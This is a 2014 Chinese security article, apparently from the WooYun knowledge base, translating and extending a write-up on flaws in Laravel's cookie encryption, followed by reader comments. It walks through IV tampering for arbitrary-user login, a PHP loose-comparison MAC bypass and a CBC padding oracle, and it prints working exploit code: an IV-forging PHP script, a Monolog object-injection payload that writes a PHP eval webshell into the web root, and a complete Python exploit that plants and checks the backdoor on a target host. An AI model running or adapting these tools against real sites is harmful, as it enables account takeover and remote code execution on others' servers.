@@ -1,0 +1,241 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">Laravel cookie伪造,解密,和远程命令执行</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">fate0</a> <span class="bull">·</span> <time title="2014/04/29 17:48" ui-time="" datetime="2014/04/29 17:48" class="published ng-binding ng-isolate-scope">2014/04/29 17:48</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><p>from:<a href="https://labs.mwrinfosecurity.com/blog/2014/04/11/laravel-cookie-forgery-decryption-and-rce/">laravel-cookie-forgery-decryption-and-rce</a></p><h2>0x00 内容</h2><hr><ul><li><a href="#translate">名词约定</a></li><li><a href="#introduction">简介</a></li><li><a href="#authenticating_as_any_other_user">任意用户登录</a></li><li><a href="#sending_arbitrary_ciphertexts">发送任意密文</a></li><li><a href="#decrypting_ciphertexts">解密密文</a></li><li><a href="#forging_valid_ciphertexts_for_arbitrary_plaintexts">为任意明文伪造合法的密文</a></li><li><a href="#remote_code_execution">远程代码执行</a></li><li><a href="#summary">译者总结</a></li></ul><p><a name="translate"></a></p><h2>0x01 名词约定</h2><hr><h3>下图为CBC模式加密过程</h3><p><img alt="enter image description here" img-src="b52f08d66004990b881f77412edf5b3c9696ef56.jpg"></p><h3>下图为CBC模式解密过程</h3><p><img alt="enter image description here" img-src="68c6c3fe236273029c5095a2c42730a2cb150b5c.jpg"></p><ul><li>Plaintext: 明文(P)</li><li>Ciphertext: 密文(C)</li><li>Initialization Vector: 初始化向量(IV)</li><li>Key: 密钥(K)</li></ul><p><img alt="enter image description here" img-src="d6433ad91c2b883a0fc4e5a8fc4c1e320cdefb86.jpg"></p><p><a name="introduction"></a></p><h2>0x02 简介</h2><hr><p>Laravel PHP框架中的加密模块存在漏洞，攻击者能够利用该漏洞伪造session cookie来实现任意用户登录， 在某些情况下，攻击者能够伪造明文对应的密文，并以此来实行远程代码执行。</p><p>Laravel是一个免费，开源的PHP框架，它为现在的web开发人员提供了很多功能，包括基于cookie的session功能。 为了防止攻击者伪造cookie，Laravel会为其加密并带上一个消息认证码(MAC)。当接收到cookie时，会计算出相对应的MAC， 并与cookie所带的MAC做比较。如果两MAC不一致，则认为cookie已经被篡改，请求会被终止。</p><p><a name="authenticating_as_any_other_user"></a></p><h2>0x03 任意用户登录</h2><hr><p>下面的代码展示了MAC验证和解密过程:</p><pre><code>#!php
+$payload = json_decode(base64_decode($payload), true);
+
+if ($payload['mac'] != hash_hmac('sha256', $payload['value'], $this-&gt;key))
+    throw new DecryptException("MAC for payload is invalid.");
+
+$value = base64_decode($payload['value']);
+$iv = base64_decode($payload['iv']);
+
+$plaintext = unserialize($this-&gt;stripPadding($this-&gt;mcryptDecrypt($value, $iv)));
+</code></pre><p>从上面的代码可以看出MAC只对value进行校验，并不能保证初始化向量(IV)的完整性。 Laravel使用Rijndael－256的密码分组链接(CBC)模式。 着也就意味着，没有对IV进行校验，攻击者能够任意修改第一个块的明文。</p><p>Laravel “remember me”的cookie格式是user ID字符串，因此恶意用户可以修改他们自个的session cookie，达到登录任意用户，假设我们的用户ID为<code>"123"</code>，session cookie原始明文为 <code>s:3:"123";后接22byte的补充</code>: <code>s:3:"123";\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16\x16</code> (译者注: Laravel用的是PKCS7 padding，与PKCS5不同的是，<a href="http://tools.ietf.org/html/rfc2898">PKCS5</a>明确填充的内容psLen是1-8， 而<a href="http://tools.ietf.org/html/rfc2315">PKCS7</a>没有这限制。)</p><p>假设系统生成的cookie中的IV是这样子的:</p><pre><code>V\xc5\xb5\x03\xf1\xd4"\xe5+&gt;c\xffJPN\xad\x9f\xd6\xa0\x9cV\xe3@\x9c\xd5\xa0\xd1\xddS\x1d\xc9\x84
+</code></pre><p>如果我们想伪造ID为1的用户，也就是cookie明文为<code>s:1:"1";后接24byte的补充</code>，为了能够使服务器端成功解密出ID为1的明文， 需要按照以下步骤生成IV:</p><p><img alt="enter image description here" img-src="1a62de336bcc8eb4772c315c24f9f28f30496e87.jpg"></p><p>就获得了Pb 相对应的IVb，提交新的cookie，我们就成了ID为1的用户，也可以用同样的方法来登录其他ID。 对攻击者来说，能够登录任意用户也是相当牛逼的，但你能牛逼的程度取决于应用程序傻逼的程度。有没有一种方法， 能够通杀使用Laravel的应用呢？</p><p><a name="sending_arbitrary_ciphertexts"></a></p><h2>0x04 发送任意密文</h2><hr><p>另外一个问题，进行MAC检验的时候使用的是<code>!=</code>。这以为着PHP在实际比较前会进行类型判断。hash_hmac返回的结果永远都是字符串， 但是如果<code>$payload['mac']</code>是一个整型，那么强制类型转换会使得伪造一个对应的MAC变得相对简单， 例如，正确的MAC以"0"或者其他非数字起头，那么整数0将与之匹配，如果以"1x"(x非数字)，那么整数1与之匹配，依此类推。 (译者注:作者难道没有被1e[1-9]xxx坑过没?)</p><pre><code>#!php
+var_dump('abcdefg' == 0); // true
+var_dump('1abcdef' == 1); // true
+var_dump('2abcdef' == 2); // true
+</code></pre><p>由于MAC是经过json_decode处理的，攻击者可以提供一个整型的MAC，这也就意味着，攻击者能够提供一个正确的MAC给任意密文。</p><p><a name="decrypting_ciphertexts"></a></p><h2>0x05 解密密文</h2><hr><p>Laravel使用的是CBC模式的分组密码，我们也能够提供任意密文让其解密，我们是否能够实施一次牛逼哄哄的 <a href="http://link.springer.com/chapter/10.1007/3-540-46035-7_35">CBC padding oracle attack</a>攻击呢？ 答案是：在某种情况下，YES</p><p>一次有预谋的padding oracle attack攻击需要目标应用能够泄漏不同填充下解密的状态，回头看看解密过程的代码， 有三个地方填充状态可能会被泄漏:</p><ul><li>mcryptDecrypt(): 无侧漏，就是调用<code>mcrypt_decrypt()</code>，没对padding进行处理</li><li>stripPadding(): 无明显侧漏，该方法检测padding是否合法，但不会报告错误，只是返回输入是否被篡改。 这里有个基于时间的边信道侧漏，是否多调用substr()，但是我们选择无视它。</li><li>unserialize(): 当error reporting启用，一个不合法的PHP序列化字符串，它会侧漏输入字符串的长度。</li></ul><p>嗯，当PHP reporting启用时(其实应该是Laravel的debug模式开启时)，反序列化解密后的数据会告诉我们有多少byte的padding被去除， 例如<code>unserialize()</code>爆出"offset X of 22 bytes"的错误时，我们就可以知道这里有10byte的padding。</p><p>这样的侧漏对于组织一次有预谋的padding oracle attack来说，足够！</p><p><a name="forging_valid_ciphertexts_for_arbitrary_plaintexts"></a></p><h2>0x06 为任意明文伪造合法的密文</h2><hr><p>既然有了个CBC decryption oracle，那就很有可能利用<a href="https://www.usenix.org/legacy/events/woot10/tech/full_papers/Rizzo.pdf">CBC-R</a>技术来加密任意明文。</p><p><img alt="enter image description here" img-src="61c9f1c7f43e86ff822a3cd7e6f51312d681c91e.jpg"></p><p>CBC模式的解密过程为 Pi=DK(Ci) xor Ci−1,C0=IV ，如果攻击者能够控制或者知晓 DK(Ci) 和Ci−1 ， 他就能够生成他想要的明文块。既然这里有个选择密文攻击，很显然攻击者能够控制 Ci 和 Ci−1 ， 至于DK(Ci)</p><p>我们能够利用decryption oracle获得，因此攻击者无需知道密钥K即可对任意明文加密。牛逼吧，如果应用程序使用了这套加密API，我们就伪造密文来执行敏感操作，但是这还是得取决于应用有多傻逼， 我们希望变得更牛逼。</p><p><a name="sending_arbitrary_ciphertexts"></a></p><h2>0x07 发送任意密文</h2><hr><p>我们已经使用<code>unserialize()</code>作为我们padding oracle的基础， 那我们再次利用<code>unserialize()</code>作一次PHP对象注入来达到任意代码执行，如何？</p><p>经过搜索Laravel代码之后，发现还是蛮多类定义了 <code>__wakeup()</code> 或者 <code>__destruct()</code> 魔术方法， 不过我发现最有趣的一个类当属被很多项目引用的monolog PHP日志记录框架中的BufferHandler类，显然，如果payload利用的是被广泛应用的monolog而不是其他特定的类，会更为通用。 使用Composer(PHP依赖管理器)时，monolog很有可能被包含，因为它可能被注册为PHP class autoload，这也就意味着， monolog不用被明确的包含在我们请求的文件中，当我们反序列化的时候，PHP会自动寻找加载这个类。</p><p>BufferHandler类包装这另外一个log处理类，当BufferHandler对象被销毁时，BufferHandler对象会用它包含的实际处理log的对象处理它当前的log buffer，一个比较好的选择是能够存储到任意流资源(比如说文件流)的StreamHandler类，所以我们的计划是注入一个包含StreamHandler对象的BufferHandler对象，其中StreamHandler对象的流资源指向web根目录，并且BufferHandler内包含着带有php webshell的log buffer，好，计划通，行动。</p><p>利用下面的代码，很容易生成对应的payload:</p><pre><code>#!php
+&lt;?php
+
+require_once 'vendor/autoload.php';
+
+use Monolog\Logger;
+use Monolog\Handler\StreamHandler;
+use Monolog\Handler\BufferHandler;
+
+$handler = new BufferHandler(
+    new StreamHandler('target-file.php')
+);
+$handler-&gt;handle(array(
+    'level' =&gt; Logger::DEBUG,
+    'message' =&gt; '&lt;?php eval(hex2bin($_GET[\'x\']));?&gt;',
+    'extra' =&gt; array(),
+));
+print bin2hex(serialize($handler)) . "\n";
+?&gt;
+</code></pre><p>上面的脚本会生成我们的payload:</p><pre><code>O:29:"Monolog\Handler\BufferHandler":3:{s:10:"\x00*\x00handler";O:29:"Monolog\Handler\StreamHandler":1:{s:6:"\x00*\x00url";s:15:"target-file.php";}s:9:"\x00*\x00buffer";a:1:{i:0;a:3:{s:5:"level";i:100;s:7:"message";s:34:"&lt;?php eval(hex2bin($_GET['x']));?&gt;";s:5:"extra";a:0:{}}}s:13:"\x00*\x00bufferSize";i:1;}
+</code></pre><p>通过上面介绍的技巧，我们可以加密该payload，作为cookie提交上去的时候，代码就执行了。</p><p><a name="summary"></a></p><h2>0x08 译者总结</h2><hr><p>对于原作者所说的漏洞，我拿一个开源blog <a href="https://github.com/5-say/laravel-4.1-simple-blog">laravel-4.1-simple-blog</a> 做实验，将关键文件回滚到存在漏洞状态，如果有人想研究，也可以在这<a href="http://static.wooyun.org/20141017/2014101716030797096.zip">laravel-cookie-forgery-decryption-and-rce.zip</a>下载完整文件。</p><h3>测试1 任意用户登录</h3><p>在本地:</p><p><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0deb9bbdebbea5e88b81e9b58de9b5a7e5b9abeb85ba6b6c79683d4d6b6c796877687f6223627f6a">[email&#160;protected]</a>，得到用户ID为62，利用以下代码即可获取指定ID用户的cookie</p><pre><code>#!php
+&lt;?php
+
+if ($argc &lt; 4) {
+    print("[*] Usage ".$argv[0]." cookie userid targetid\n");
+    return;
+}
+
+$cookie = json_decode(base64_decode($argv[1]), true);
+$userid = $argv[2];
+$targetid = $argv[3];
+
+$iv_a = base64_decode($cookie['iv']);
+$p_a = addPadding(serialize($userid));
+$p_b = addPadding(serialize($targetid));
+
+$iv_b = base64_encode($iv_a ^ $p_a ^ $p_b);
+
+$cookie['iv'] = $iv_b;
+
+echo base64_encode(json_encode($cookie))."\n";
+
+function addPadding($value) {
+    $block_size = 32;
+    $pad = $block_size - (strlen($value) % $block_size);
+    return $value.str_repeat(chr($pad), $pad);
+}
+?&gt;
+</code></pre><p>运行结果</p><p><img alt="enter image description here" img-src="828b5bde2d9fb32ae8a058b6f3fd6383e0c2950d.jpg"></p><h3>测试2 利用padding oracle来实现RCE</h3><p>我修改原作者生成payload的脚本，对比生成的payload和原作者给的payload，发现原作者把一些无用的protect属性给去除了， payload显得比较短，打算直接使用作者给的payload。</p><p>但是！原作者的payload留了个大坑，正常访问下，index.php的工作目录是web目录， 但是unserialize cookie之后产生的BufferHandler对象和字符串做运算，而BufferHandler类没实现_&#95;toString魔术方法， 从而导致触发fatal error，使用register&#95;shutdown_function注册的回调函数$this->close被调用，但是！在我测试环境<code>ubuntu 12.04 64bit + php 5.3.10</code>下，触发异常导致$this->close被调用的时候，工作环境被切换到了根路径'/'，从而导致写文件失败。</p><p>另外一个坑是mac校验处，本来以为<code>(10/16.0) ** 3 = 0.244140625</code>，开头连续三个数字字符的概率还算低，结果跑一遍才发现远远低估mac校验这里的情况了，比如说正确的校验值是<code>79e58c735e1105d7222f321031a782251da88ebd08cdc1de926ead2df4b9d3fd</code>， 这种情况就让人很无奈。在实际情况中，正确的做法是换payload，在这里我就直接换key， 最后把key换成<code>Http://WeiBo.COM/Fatez3r0/home?Y</code>。 由于程序推ciphertext，推cv的关联性，以及推1 byte cv的随机性，多线程在此处意义不大。</p><p>下面是我根据上面的原理编写的exploit</p><pre><code>#!python
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+from __future__ import print_function
+
+import re
+import sys
+import json
+import struct
+import base64
+import requests
+from optparse import OptionParser
+
+
+def init_parser():
+    print("")
+    print("=== POC for laravel RCE ===")
+    print("=== by fate0            ===")
+    print("=== <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="13757267762353757267766976617c3d7c6174">[email&#160;protected]</a>  ===")
+    print("=== weibo.com/fatez3r0  ===")
+    print("")
+    usage = "Usage: %prog --host http://www.fatezero.org"
+    parser = OptionParser(usage=usage, description="POC for laravel RCE")
+    parser.add_option("--host", type="str", dest="host", help="remote host name")
+    return parser
+
+
+class LaravelOracle(object):
+    """
+    提供32位的payload，也就是明文P
+    返回相对应的32byte IV
+    """
+    block_size = 32
+
+    def __init__(self, domain, plaintext, ciphertext):
+        self.domain = domain
+        self.timeout = 7
+        self.re_pattern = re.compile("Error\sat\soffset\s\d{1,2}\sof\s([\d]{1,2})\sbytes", re.DOTALL | re.M)
+        self.plaintext = bytearray(plaintext)  # 32byte的payload
+        self.ciphertext = bytearray(ciphertext)  # 32byte的ciphertext
+        self.cv = bytearray()   # 正确的cv (中间值)
+        self.iv = bytearray()
+        self.cookie = {
+            'mac': 0,
+            'value': self.ciphertext,
+            'iv': bytearray('0'*32)
+        }
+        self.modify_cookie_mac()
+
+    @staticmethod
+    def add_padding(value):
+        """
+        对value进行padding
+        """
+        pad = LaravelOracle.block_size - (len(value) % LaravelOracle.block_size)
+        return "{value}{padding}".format(value=value, padding=chr(pad)*pad)
+
+    @staticmethod
+    def format_cookie(cookie):
+        """
+        将易操作的cookie转换成laravel的cookie
+        """
+        tmp_cookie = dict()
+        send_cookie = dict()
+
+        tmp_cookie['iv'] = base64.b64encode(cookie['iv'])
+        tmp_cookie['value'] = base64.b64encode(cookie['value'])
+        tmp_cookie['mac'] = int(cookie['mac'])
+
+        send_cookie['laravel_session'] = base64.b64encode(json.dumps(tmp_cookie))
+        return send_cookie
+
+    def modify_cookie_iv(self, index):
+        if len(self.cv) != index:
+            print("[-] Something Wrong")
+            sys.exit()
+
+        tmp_append = bytearray()
+        for each_c in self.cv:
+            tmp_append.append(each_c ^ (index+1))
+
+        self.cookie['iv'] = self.cookie['iv'][0:LaravelOracle.block_size-index] + tmp_append
+
+    def modify_cookie_mac(self):
+        """
+        获取正确的mac
+        一个32byte的分组，只有1个正确的mac
+        """
+        while True:
+            send_cookie = self.format_cookie(self.cookie)
+            response = requests.get(self.domain, cookies=send_cookie, timeout=self.timeout)
+            if response.status_code == 500:
+                return True
+            self.cookie['mac'] += 1
+
+    def guess_cookie_iv_byte(self, index, value):
+        """
+        猜测一个字节的IV
+        """
+
+        self.cookie['iv'][LaravelOracle.block_size-index-1] = value
+        send_cookie = self.format_cookie(self.cookie)
+        response = requests.get(self.domain, cookies=send_cookie, timeout=self.timeout)
+
+        re_result = self.re_pattern.findall(response.content)
+        if not re_result:
+            if index != 31:
+                return False
+            if response.status_code == 200:
+                self.cv.insert(0, value ^ (index+1))
+                return True
+        elif int(re_result[0]) &gt;= LaravelOracle.block_size - index:
+            return False
+        else:
+            self.cv.insert(0, value ^ (index+1))
+            return True
+
+    def exploit(self):
+        for index in xrange(32):
+            self.modify_cookie_iv(index)
+            for value in xrange(256):
+                if self.guess_cookie_iv_byte(index, value):
+                    break
+            print(index, hex(self.cv[0]))
+
+        for p_char, cv_char in zip(self.plaintext, self.cv):
+            self.iv.append(p_char ^ cv_char)
+
+
+def main():
+    parser = init_parser()
+    option, _ = parser.parse_args()
+    domain = option.host
+
+    if not domain:
+        parser.print_help()
+        sys.exit(0)
+
+    domain = domain if domain.startswith('http') else "http://{domain}".format(domain=domain)
+    domain = domain if not domain.endswith('/') else domain[:-1]
+
+    cookie = dict()
+    cookie['mac'] = 0
+
+    payload = ('''O:29:"Monolog\Handler\BufferHandler":3:{s:10:"\x00*\x00handler";O:29'''
+               ''':"Monolog\Handler\StreamHandler":1:{s:6:"\x00*\x00url";s:26:"/var/www/blog/public/x.php";}'''
+               '''s:9:"\x00*\x00buffer";a:1:{i:0;a:3:{s:5:"level";i:100;s:7:"message";s:34:"&lt;?php '''
+               '''eval(hex2bin($_GET['x']));?&gt;";s:5:"extra";a:0:{}}}s:13:"\x00*\x00bufferSize";i:1;}''')
+
+    padding_payload = LaravelOracle.add_padding(payload)
+    payload_block = reversed(struct.unpack("32s"*(len(padding_payload)/32), padding_payload))
+
+    ciphertext = bytearray('0'*32)
+    for each_payload_block in payload_block:
+        print("[plaintext] {payload_block}".format(payload_block=each_payload_block))
+        print("[ciphertext] {ciphertext}".format(ciphertext=base64.b64encode((ciphertext[:32]))))
+        LO = LaravelOracle(domain, each_payload_block, ciphertext[:32])
+        LO.exploit()
+        print("[iv] {iv}".format(iv=base64.b64encode(LO.iv)))
+        ciphertext = LO.iv + ciphertext
+
+    cookie['iv'] = ciphertext[:32]
+    cookie['value'] = ciphertext[32:]
+    cookie['mac'] = 0
+
+    while True:
+        send_cookie = LaravelOracle.format_cookie(cookie)
+        requests.get(domain, cookies=send_cookie, timeout=7)
+        if requests.get("{domain}/{backdoor}".format(domain=domain, backdoor='x.php')).status_code == 200:
+            print("cookie: \n{cookie}".format(cookie=send_cookie))
+            return
+        cookie['mac'] += 1
+
+
+if __name__ == '__main__':
+    main()
+</code></pre><p>运行结果</p><p><img alt="enter image description here" img-src="7b86395b3cf4e899b96e802cf92a01fb551af9b3.jpg"></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20150328233635ad0d5079993a5697948ccd411641b6f5.jpg" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">BeenQuiver</span> <span class="reply-time">2015-08-10 17:01:52</span></div><p></p><p>吊炸天！！！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">幽灵</span> <span class="reply-time">2014-10-25 14:41:28</span></div><p></p><p>译者辛苦了，看了原文和译文，只说一点，就是原文结尾那段，个人认为还是加上比较好一些，毕竟“发现问题-研究问题-解决问题”这么一条路下来比较顺畅一些，而且相对也尊重原文，至于上面说的那些“乱七八糟”等等，对于作为一个Laravel使用者的我来说没什么特别的感觉，因为那不是本文的重点，作为一个我这样的一个使用者，更多的还是会关注问题本身以及解决方案。PS：闲扯几句，原文有解决方案的最好还是带着翻译过来，虽然相比之下可能译者会更多的关注过程，但是从我接触到了解到的安全领域从业者来说，一味的发现漏洞和利用漏洞的，不如那些除了发现和利用漏洞 ，更注重修复漏洞的，不同观点欢迎讨论，这里我只是发表了一下自己的看法，如有偏颇，还请指正，谢谢，最后，译者辛苦了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">abc</span> <span class="reply-time">2014-06-11 10:12:46</span></div><p></p><p>从专业角度讲，研究者理应提供好程序包的版本号，这样严谨</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mramydnei</span> <span class="reply-time">2014-05-01 00:36:27</span></div><p></p><p>受教了，对于“专业”评论家只能说 U can u up，no can no bb</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">testor</span> <span class="reply-time">2014-05-01 00:18:24</span></div><p></p><p>对楼上的喷子表示呵呵了。。。顶楼主。并且感谢楼主辛苦整理分享。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-04-30 12:36:56</span></div><p></p><p>一个措辞不当，会引起larval fans这么大反应……<br>fate0是一个安全人员，比较注重攻击的过程，所以其他方面可能每太注意，抱歉。<br>另外此文并非纯粹的翻译，而是fate0根据自己的理解写了很多。其中的exp写的也很精彩。<br>因为几个小点就上升到丢国人脸面的地步这也太大了点。各位larval fans请淡定，原文措辞已修改。<br>感谢fate0贡献此文。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Joy</span> <span class="reply-time">2014-04-30 12:32:59</span></div><p></p><p>哈哈，真的会哦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">maodun</span> <span class="reply-time">2014-04-30 12:31:38</span></div><p></p><p>顶楼主，翻译这事本来就是传播知识，还是个体力活，不喜欢的人可以去看原文。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">fate0</span> <span class="reply-time">2014-04-30 12:28:11</span></div><p></p><p>好吧，初次翻译，没有经验，请见谅，这一次就不小心就触犯了laravel的fans，还好我没在译文下写“python是世界上最好的语言” ，要不然又引起了语言之争: )</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Joy</span> <span class="reply-time">2014-04-30 12:22:34</span></div><p></p><p>好吧，我去年开始一直在用laravel，觉得它很好，所以看到这句话的时候就觉得不应该这样翻译，没别的意思，国外排行第一的东西肯定不是“乱七八糟”的，所以，其实你可以不翻译或者简单翻译，但不能改掉原文的意思，整个攻击技巧是很吸引人，但是由于能力不足，没看懂。换个角色，如果是一个程序员或者企业，看到这此消息第一时间是要让程序员来处理的，但整文没看见怎么处理，没办法看了原文才知道是13年6月就已经处理了，虽然后面又补了一次。如果要想别人看过程，可以把解决方案或者处理状态放文章最后。PS: 程序员还是有很多关注wooyun的 :）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">fate0</span> <span class="reply-time">2014-04-30 12:13:36</span></div><p></p><p>见上，U can U up，我对这个框架不熟悉，不知道为什么就随口说了一句“乱七八糟”就引起了众怒了 ：）实际上我写那个exp花费的时间比翻译的时间还长。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">fate0</span> <span class="reply-time">2014-04-30 12:09:56</span></div><p></p><p>之所以翻译成“乱七八糟”，是因为我实在懒得继续翻译那段了，翻译来翻译去都是说laravel怎么好，怎么好，实在有点儿烦，不给后一段的原因是，你不觉得整个攻击技巧更吸引人么，而且wooyun上没那么多程序员吧 ：）</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Voidea</span> <span class="reply-time">2014-04-30 11:29:03</span></div><p></p><p>这个翻译也太那个了吧。。什么“它为现在的web开发人员提供了一堆乱七八糟的功能”？。。这什么乱七八糟的翻译？麻烦先去学好你的英文再去翻译吧。。还把最后的一段给干掉了。。这恶心别人也别丢国人的脸面。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Joy</span> <span class="reply-time">2014-04-30 11:24:09</span></div><p></p><p>" It provides a lot of the functionality required for developing a modern web application"</p><p>作者是什么原因要翻译成：“它为现在的web开发人员提供了一堆乱七八糟的功能” 这么恶心的结果呢？</p><p>另外为何不给出原文最后一段呢？让大家都去升级自己的版本。<br>https://github.com/laravel/framework/commit/3271f78e85a343bde67dae5a84c79739fbe8d4be</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">L.N.</span> <span class="reply-time">2014-04-30 10:54:05</span></div><p></p><p>学习了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">A胖</span> <span class="reply-time">2014-04-29 18:49:56</span></div><p></p><p>流弊</p><p></p></div></div></div></div></div></main>
